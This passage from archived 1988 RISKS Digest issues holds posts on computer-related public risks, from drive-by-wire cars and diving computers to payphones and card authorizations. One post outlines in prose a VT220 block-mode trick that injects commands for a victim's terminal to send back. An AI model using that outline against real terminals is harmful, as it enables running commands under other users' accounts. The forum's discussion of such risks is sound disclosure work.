corporations conspired to delay getting the fix into all users hands.
Additional delays occurred with some customers in the form of the fix sitting
on the wrong person's desk or other confusion.  The difficulties in dealing
with the V4.5 bug have gotten the corporation's attention in a serious way, and
I think it's fair to say that should the need for a repeat performance occur,
we will do a lot better.
					- Andy Goldstein, VMS Development

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Entrepreneurial Viruses
</A>
</H3>
<address>
Chuck Weinstock 
&lt;<A HREF="mailto:weinstoc@SEI.CMU.EDU">
weinstoc@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Mon, 28 Mar 88 11:11:32 EST
</i><PRE>

An obvious next step in the virus business is to develop a virus, watch it
spread, and then sell a vaccination and/or a cure at a high price.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Early viruses (RE: <A HREF="/Risks/6.48.html">RISKS-6.48</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:BANAWAN%houston.csnet@RELAY.CS.NET">
BANAWAN%houston.csnet@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 11:54 CST
</i><PRE>

Commenting on Kevin Driscoll, if the first virus was: 
       Move(program counter) program counter+1

I used a similar instruction all the time when my school was using IBM 1620.
The instruction set of this machine operates on fields of arbitrary length.
For those readers who do not know, there was no operating system. Furthmore,
it was used exclusively by a single user. To have a fresh start, each time a
new program is to run the memory is fully cleared by a statement that move
the field that starts in byte 2 to the field that starts at byte 3.  This
instruction was entered and executed by the operator from the console.  The
result can be seen at the panel: the memory is filled by zeros continutously
It was quite legitimate (and highly recommended) thing to do before you run
a new program.
                       Sayed A. Banawan, University of Houston

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Person-in-the-Loop Amendment Signed into Law
</A>
</H3>
<address>
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 13:20:39 -0500
</i><PRE>

This from the Winter 1988 CPSR Newsletter:  The 1988 Defense Authorization
Act, signed into law, had this amendment, sponsored by Dale Bumpers:

  "No agency of the Federal government may pay for, fund, or otherwise
  support the development of command and control systems for strategic defense
  in the boost or post-boost phase against ballistic missile threats that
  would permit such strategic defense to initiate the directing of damaging or
  lethal fire except by affirmative human discretion at an appropriate level
  of authority."

For bureaucracy-watchers, the full citation is:

  National Defense Authorization Act for FY 1988-89
  H.R. 1748
  Division A  (Dept. of Defense Authorizations)
  Title II    (Research, Development, Test, and Evaluation)
  Part C      (Strategic Defense Initiative)
  Subpart 1   (SDI Funding and Program Limitations and Req'ts)
  Section 224 (SDI Architecture to Require Human Decisionmaking)

Not that a loophole mentality would be slowed a bit by this ..

#include &lt;disclaimer.h&gt;

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.49.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.51.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-86</DOCNO>
<DOCOLDNO>IA012-000129-B044-152</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.51.html 128.240.150.127 19970217020322 text/html 23098
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:01:47 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 51</TITLE>
<LINK REL="Prev" HREF="/Risks/6.50.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.52.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.50.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.52.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 51</H1>
<H2>  Tuesday 29 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Drive-by-wire BMW 
</A>
<DD>
<A HREF="#subj1.1">
Zdybel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: High Tech Trucking 
</A>
<DD>
<A HREF="#subj2.1">
Franklin Anthes
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Countering driver aggression 
</A>
<DD>
<A HREF="#subj3.1">
Leisa Condie
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Risks in diving computers 
</A>
<DD>
<A HREF="#subj4.1">
J M Hicks
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Why gamble on non-redundant systems? 
</A>
<DD>
<A HREF="#subj5.1">
Roy Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  RISKS of using the "AT&amp;T Public Phone Plus" 
</A>
<DD>
<A HREF="#subj6.1">
Henry Mensch
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The risks of rumours 
</A>
<DD>
<A HREF="#subj7.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Credit-limit handling found overly restrictive 
</A>
<DD>
<A HREF="#subj8.1">
Wm Brown III
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Program prejudice and psychological testing 
</A>
<DD>
<A HREF="#subj9.1">
Prentiss Riddle
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Funny phone 
</A>
<DD>
<A HREF="#subj10.1">
Steve Strassmann
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Risks there and whoops! still there! 
</A>
<DD>
<A HREF="#subj11.1">
A.E. Mossberg
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Drive-by-wire BMW
</A>
</H3>
<address>
&lt;<A HREF="mailto:Zdybel.pa@Xerox.COM">
Zdybel.pa@Xerox.COM
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 18:55:28 PST
</i><PRE>

Referring to Jonathan Jacky's message about 'drive by wire': 

  &gt; 'Recently BMW in West Germany introduced a V-12 drive-by-wire automobile...

The car you're referring to can only be the V-12 powered BMW 750iL, just
introduced.  In this case, 'drive by wire' means throttle control, not steering
control.  The following excerpt is from the November 87 issue of 'Road and
Track', pp. 73:

  "Each bank of cylinders sports its own Bosh Motronic engine-management
  system as well as separate air-mass meters, fuel supply, fuel pumps and
  electronic "drive-by-wire" accelerator.  An automotive first from aircraft
  practice, the drive-by-wire accelerator signals the fuel injection
  electronically; there's no direct mechanical linkage.  Also from aircraft
  practice, dual systems have an obvious benefit:  In the event one of these
  electronic wunder-banks
  fails, the other side is bound and determined to get you back home safely,
  albeit under half power."

Apparently, one of the reasons BMW has taken this approach is in order to
enable a feature they call ASC (Automatic Stability Control).  From the same
article, pp. 74:

  "ASC is a wonderful feature that, when activated from a switch on the center
  console, helps prevent uncontrolled wheelspin under varying road conditions,
  whether slippery, dry or a combination of both.  With ASC engaged, we found
  it nearly impossible to break the rear end loose, but once we deactivated the
  system, tail-out driving was a possibility.  Snowbound 750 owners will
  certainly welcome this device as readily as ABS braking."

The article does not discuss what measures BMW engineers may have taken
to ensure that the 'drive-by-wire' throttle fails 'safe.'

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: High Tech Trucking
</A>
</H3>
<address>
Franklin Anthes
&lt;<A HREF="mailto:mcvax!geocub!anthes@uunet.UU.NET ">
mcvax!geocub!anthes@uunet.UU.NET 
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 11:22:18 +0200
</i><PRE>
Organization: Greco de programmation, Bordeaux France

 Over here in France a black-box system has existed for quite a while now.
It isn't a computer, and its output goes to a paper disk, so it probably
can be tampered with.

 The two things that I know of that can be checked with this device are:

	- speed of vehicle
	- time spent by driver without resting.

 The device is used on trucks and busses. Over here most truck drivers
drive alone, so if the truck is driven for 15 hours straight, that means
the driver has been driving all that time.

 The only cases I have heard of the output of the black-box being used, is
when an accident has taken place. The output can help determine the causes
and the responsabilities involved. It may be used at other times, but it
just doesn't make the news.

Frank Anthes-Harper       ....!ucbvax!decvax!uunet!mcvax!inria!geocub!anthes

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Countering driver aggression   [For those of you who have not seen it]
</A>
</H3>
<address>
Leisa Condie
&lt;<A HREF="mailto:munnari!csadfa.oz.au!phoenix@uunet.UU.NET ">
munnari!csadfa.oz.au!phoenix@uunet.UU.NET 
</A>&gt;
</address>
<i>
Fri, 25 Mar 88 08:43:38 est
</i><PRE>

IEEE Spectrum (Tools and Toys section), Feb. 1988 without permission:

Curbing homicidal impulses

Revenger lets the frustrated driver vent aggressive impulses by emitting loud
sounds. The instrument, which looks like a radar detector and attaches to your
vehicle's dashboard, contains a sound chip and a row of light-emitting-diodes.
When the Revenger is turned on, the LEDs start flashing, and the driver has the
option of pressing three buttons: machine-gun (rat-a-tat-tat), grenade launcher
(a whistle and a boom) or a death ray (a high-pitched, oscillating frequency).
Mike Grubbs, vice president of the company that makes Revenger, jested about
the death ray:"That's something that you might aim when a pedestrian walks out
in front of you". Revenger is available through major retailers for $20- $25.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
   Risks in diving computers              ["diving", not "driving"]
</A>
</H3>
<address>
J M Hicks 
&lt;<A HREF="mailto:cudat@CU.WARWICK.AC.UK">
cudat@CU.WARWICK.AC.UK
</A>&gt;
</address>
<i>
Tue, 29 Mar 88 09:39:23 GMT
</i><PRE>

A colleague who goes diving once or twice a month told me about a diving
computer.  In order to avoid the bends, a diver must not come to the
surface too fast (unless there is a decompression chamber).  There are tables
for divers to follow showing how fast a diver may ascend safely, but these
are based on the assumption that the diver descends, remains at the same
depth for some time, and then comes to the surface.  In practice, of course,
divers go repeatedly up a little and down a little during the time they
spend underwater. The computer is supposed to be able to work out how
fast the diver should ascend after a complicated pattern of going up
and down underwater.  Apparently for a simple dive the computer takes
a more conservative view than the accepted tables.

   The usual display given by the computer shows the diver's depth.  If the
diver is going up too fast, the message "ASCEND MORE SLOWLY" appears for three
seconds, alternating with the usual display, which also lasts for three
seconds.  My colleague reckons the diver is more interested in his depth, and
it is a great temptation to ignore the warning message because it obscures the
depth display and come to the surface anyway.  Most of the time divers who do
this don't suffer, I think, because the computer takes a cautious view (I am
told it has several physiological models to work with).

   Poor human interfaces have been discussed in this forum many times, but
what opinions do people have of users' behaviour when a simple system is
replaced by a complicated system that they do not understand and they
can probably ignore because it takes a conservative view?

J. M. Hicks (a.k.a. Hilary),
Computing Services, Warwick University, Coventry, England. CV4 7AL
On JANET: cudat@UK.AC.WARWICK.CU (in the U.K.), cudat@cu.warwick.ac.uk (abroad)
From ARPAnet: try  cudat%cu.warwick.ac.uk@cunyvm.cuny.edu   (untested)
On uucp:        ...!ihnp4!mcvax!ukc!warwick!cudat
                                It helps if you spell "cudat" in lower case.

              [Sensitive users will note that quite a few systems are 
              case sensitive.  It began with Multics, as I recall.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Why gamble on non-redundant systems?   [lotto]
</A>
</H3>
<address>
Roy Smith
&lt;<A HREF="mailto:roy%phri@uunet.UU.NET ">
roy%phri@uunet.UU.NET 
</A>&gt;
</address>
<i>
29 Mar 88 03:29:20 GMT
</i><PRE>

	We all know about the advantages of redundant systems; have two
parallel systems so when one computer crashes you can keep running with the
other, perhaps at reduced efficiency.  For critical systems, redundancy is a
must.  All that's left now is to define just what makes a critical system.

	Would you believe Lotto?  I heard an ad on the radio yesterday from
the New York State Lotto commission.  It seems that they have split their
network into two halves, each running independently.  Ticket sellers have
either blue or green Lotto signs, depending on which system they are on, and
each geographical area has some of each.  So, boast the Lotto folks, if one
system goes down, you can still buy tickets and claim cash prizes from ticket
sellers with the other color sign.

	I'm still at the mercy of a single system to get my pay check printed
out on time, but it sure is comforting to know that I don't have to worry
about being able to buy a Lotto ticket whenever I want to.

Roy Smith, {allegra,cmcl2,philabs}!phri!roy
System Administrator, Public Health Research Institute
455 First Avenue, New York, NY 10016

                 [That is indeed a critical system in the eyes of many!  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
RISKS of using the "AT&amp;T Public Phone Plus"
</A>
</H3>
<address>
Henry Mensch
&lt;<A HREF="mailto:henry@GARP.MIT.EDU ">
henry@GARP.MIT.EDU 
</A>&gt;
</address>
<i>
Mon, 28 Mar 88 23:38:54 EST
</i><PRE>

The AT&amp;T Public Phone Plus service is most often found in airports, rail
stations, etc.  There is a card reader at the bottom of the phone which will do
the right thing (purportedly) with your AT&amp;T card (I didn't think to try my
FoNCard), a bank card, or an AmEx/DinersClub/etc.

Some days ago I was in Boston's Logan Airport and I spotted one of these phones
so I went up to investigate.  Instead of seeing a "Welcome" sort of screen on
the display, I saw a display which read "if you want to make another call,
press the &lt;frob&gt; button."  Further inspection revealed that the receiver, while
sitting in the hangup hook, didn't fit well enough to depress the lever which
would have terminated the calling session.  Over the next few days I noted that
the same situation existed on other "Public Phone Plus" devices in remote
places (other terminals of Logan Airport, as well as JFK and LAG airports).

Hasn't anyone been burned by this yet?

# Henry Mensch / &lt;henry@garp.mit.edu&gt; / E40-379 MIT, Cambridge, MA
#      {ames,cca,rochester,harvard,mit-eddie}!garp!henry

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
The risks of rumours
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Tue, 29 Mar 88 11:04:22 est
</i><PRE>

I thought this might make a good RISKS item, as it resembles the shutdown
of a computer network because of a perceived hacker threat (sorry I can't
remember which issue!).

A colleague told me the other day that he'd heard that the Australian
Federal Police were going through the various Universities, armed with
a search warrant, looking for pirated software on PC hard disks.  I could
not find anyone who actually _saw_ this, but they'd all "heard of it".
However, the threat was sufficient to cause people to stay up at all
hours, reformatting their disks!  I subsequently received the following
reply from someone who would rather remain anonymous:

  We heard about this too!  It caused quite a panic around here until the
  Dean phoned around to other Faculties/Unis.  It is not true.  We heard
  that Macquarie had been 'hit', they though that SU had been hit &amp; SU
  thought that we had.  It apparently partly stems from a letter that was
  circulated at ANU warning people there about the risks of software
  piracy &amp; the uni refusing to take any blame for stolen programs.  It may
  well have been due to some rumour planting by FAST itself.  As you said
  though, a lot of people got rid of pirated software.  At least now people
  have thought about what they are doing/have done.  

Who are "FAST"?  Federation Against Software Theft - a commercial outfit
consisting of the head honchos from the various software distributors, who
think they can stamp out software piracy.

Dave Horsfall (VK2KFU), Alcatel-STC Australia, dave@stcns3.stc.oz
dave%stcns3.stc.OZ.AU@uunet.UU.NET, ...munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Credit-limit handling found overly restrictive (<A HREF="/Risks/6.50.html">RISKS-6.50</A>)
</A>
</H3>
<address>
Wm Brown III 
&lt;<A HREF="mailto:Brown@GODZILLA.SCH.Symbolics.COM">
Brown@GODZILLA.SCH.Symbolics.COM
</A>&gt;
</address>
<i>
Tue, 29 Mar 88 13:48 PST
</i><PRE>

  Date: Mon, 28 Mar 1988  19:06 EST
  From: LENOIL@XX.LCS.MIT.EDU

  I assume that the number is used to remove the associated hold, which is then
  replaced with the actual charge.  If your bank doesn't work this way, you
  should switch to one that does. (I've never had a problem with my Citibank
  MasterCard, so I don't think the problem is endemic to MasterCards.)

Look at the number of characters in an authorization code; it is far too small
to reflect the number of authorizations issued by just one processing center on
one busy day.  I believe that the banks are really interested in covering their
soft parts, as usual, rather than making the system airtight.  All they need to
prove is that an authorization was (or was not) obtained at the time of sale.
I know from personal experience that authorizations are frequently issued for
estimated amounts; most hotels call for them as soon as someone checks in, long
before phone or room service charges can even be estimated.  Restaurants
frequently bring back charge slips for signature without a total, but with an
authorization code.

I don't think that authorization codes are actually generated by the bank which
issued your credit card.  The merchant calls HIS bank's processing center
(which may serve many different banks); that center's computer verifies the
credit available on your account, then IT issues a number which the merchant
writes on the charge slip.  The only time anyone really cares about that number
is when you don't pay your bill.  Then the important question is whether the
merchant really DID call for authorization before accepting your plastic (in
which case it becomes the bank's problem) or not (in which case he eats the
loss).  It's just electronic finger-pointing.

I would speculate that the codes are some sort of hash of date, time, account
number(s) etc. which would make it impossible for the merchant to dummy up an
authorization after the fact.  As to not having problems with your card, the
system is designed to be almost invisible under normal circumstances.  Unless
you charge a lot of estimated amounts AND are near your credit limit, you
probably won't ever know that it is there.  The only way I have found to check
on it is to obtain both your current debt and available credit from an on-line
source (such as an ATM).  If they total to less than your maximum line, there
is probably a hold floating around in there.

    [The authorization code is a protection for the card acceptor.  If the
    card authorizer grants an authorization code, then it will grant the
    payment.  Otherwise maybe not, e.g., if the account is bogus!  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Program prejudice and psychological testing
</A>
</H3>
<address>
Prentiss Riddle
&lt;<A HREF="mailto:ut-sally!im4u!woton!riddle@uunet.uu.net ">
ut-sally!im4u!woton!riddle@uunet.uu.net 
</A>&gt;
</address>
<i>
22 Mar 88 14:09:58 GMT
</i><PRE>
Organization: Shriners Burns Institute, Galveston

&gt;&gt; Your answers to a few meaningless questions on a job interview could be
&gt;&gt; interpreted for drug use, integrity of character, and watching Saturday
&gt;&gt; Morning Cartoons. 

This is another case in which computers only facilitate an already existing
risky practice.  Corporate personnel offices have been misusing psychological
testing for years.  A member of my family was once diagnosed as "neurotic" by
an employer (who then in a fit of paternalism informed the employee's spouse
but not the employee).  I mistrust psychological testing even in the hands of
professionals trained to appreciate its limits; if widely used for personnel
decisions it could exceed even bogus lie detector tests in the damage it might
do to innocent individuals' careers and lives.

-- Prentiss Riddle ("Aprendiz de todo, maestro de nada.")
-- Opinions expressed are not necessarily those of my employer.
-- riddle%woton.uucp@cs.utexas.edu  {ihnp4,uunet}!ut-sally!im4u!woton!riddle

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
funny phone
</A>
</H3>
<address>
Steve Strassmann 
&lt;<A HREF="mailto:straz@MEDIA-LAB.MEDIA.MIT.EDU">
straz@MEDIA-LAB.MEDIA.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 02:44 EST
</i><PRE>

My father uses a service provided by the Peoples Phone Company of Connecticut.
From anywhere in the US, you can dial an 800 number, and then enter a password
(via touchtone) to call him or a third party, and he gets the bill. Many PPC
customers share the same 800 number.

Unfortunately, the service was widely abused when this number became widely
known, so it was changed. Last week I was greatly amused to discover:

 (1) although the phone number was changed, the passwords weren't,
     because (according to the president of PPC) they "didn't want to
     inconvenience existing users too much."

 (2) when you dialed the old 800 number, you got a recording saying
     "This number is no longer in service... the NEW number is ...."

Needless to say, yet another change is in the works.

Steve Strassmann, MIT Media Lab, Cambridge, Mass.

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
risks there and whoops! still there!
</A>
</H3>
<address>
a.e. mossberg 
&lt;<A HREF="mailto:aem@miavax.miami.edu">
aem@miavax.miami.edu
</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 22 Mar 88 13:03:57 EDT

In <A HREF="/Risks/6.47.html">RISKS-6.47</A> Jerry Leichter suggests vt220 terminals are somewhat secure....

I think that the problem is better stated as 'block mode', not
programmable function keys.  I've looked at our vt220 manuals and 
the problem I stated before remains.. I can send a sequence like this:

	lock keyboard
	erase display
	block mode on
	output whatever sequence of commands I want executed...
	send screen

I tend to doubt there are many people who are quick enough to go into setup
to unlock the keyboard for the sequence executes, and who pay enough
attention to even catch it, if I were to do a clear screen, block mode off,
unlock keyboard at the end of the above sequence.  Anyway, why is block mode
still around?  I can't recall seeing ANY application that used it.  (I kinda
vaguely remember a pseudo-full-screen editor on the UNIVAC that might have
needed it.)

a.e.mossberg 				Internet: aem@mthvax.miami.edu
					Bitnet: aem%mthvax.miami.edu@cunyvm
Univ of Miami Hertz Laboratory		Uucp: ...!uunet!miavax!aem

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.50.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.52.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-87</DOCNO>
<DOCOLDNO>IA012-000129-B044-175</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.52.html 128.240.150.127 19970217020337 text/html 32515
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:02:03 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 52</TITLE>
<LINK REL="Prev" HREF="/Risks/6.51.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.53.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.51.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.53.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 52</H1>
<H2>  Friday 1 April 1988  </H2>
<H3>Forum on Risks to the Public in Computers and Related Systems</H3>
<I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
April Fool's warning from Usenet</A>
<DD><A HREF="#subj1.1">Gene Spafford via Cliff Stoll</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
Quebec Probing Leak of Government Information --</A>
<DD><A HREF="#subj2.1">Glen Matthews</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
New virus reported</A>
<DD><A HREF="#subj3.1">Wes Brzozowski via Dave Goldblatt via Al Stangenberger</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">  Virus precursor: "ANIMAL"</A>
<DD>
<A HREF="#subj4.1">Mike Van Pelt</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
More On Race and Ethnicity Questions...</A>
<DD><A HREF="#subj5.1">Mike Pabrinkis</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
Re: Short stories of old computer risks</A>
<DD><A HREF="#subj6.1">Ephraim Vishniac</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
Re: Notifying users of security problems</A>
<DD><A HREF="#subj7.1">Hugh Davies</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
Credit-limit handling found overly restrictive</A>
<DD><A HREF="#subj8.1">Henry Mensch</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
Bankcard authorizations</A>
<DD><A HREF="#subj9.1">Fred McKay</A><BR>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
Terminals and checking the facts</A>
<DD><A HREF="#subj10.1">Jerry Leichter</A><BR>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1"> April Fool's warning from Usenet</A></H3>
<ADDRESS>
Cliff Stoll
&lt;<A HREF="mailto:cliff@Csa5.LBL.Gov">cliff@Csa5.LBL.Gov</A>&gt;
</ADDRESS>
<I>Thu, 31 Mar 88 12:17:48 PST</I><PRE>

Here's the warning from USENET's  news.announce.important:

From: spaf@cs.purdue.EDU (Gene Spafford)
Subject: Warning: April Fools Time again (forged messages on the loose!)
Date: 1 Apr 88 00:00:00 GMT
Organization: Dept. of Computer Sciences, Purdue Univ.

Warning: April 1 is rapidly approaching, and with it comes a USENET
tradition. On April Fools day comes a series of forged, tongue-in-cheek
messages, either from non-existent sites or using the name of a Well Known
USENET person. In general, these messages are harmless and meant as a joke,
and people who respond to these messages without thinking, either by flaming
or otherwise responding, generally end up looking rather silly when the
forgery is exposed.

So, for the next couple of weeks, if you see a message that seems completely
out of line or is otherwise unusual, think twice before posting a followup
or responding to it; it's very likely a forgery.

There are a few ways of checking to see if a message is a forgery. These
aren't foolproof, but since most forgery posters want people to figure it
out, they will allow you to track down the vast majority of forgeries:

        o Russian computers. For historic reasons most forged messages have
          as part of their Path: a non-existent (we think!) russian
          computer, either kremvax or moscvax. Other possibilities are
          nsacyber or wobegon. Please note, however, that walldrug is a real
          site and isn't a forgery.

        o Posted dates. Almost invariably, the date of the posting is forged
          to be April 1.

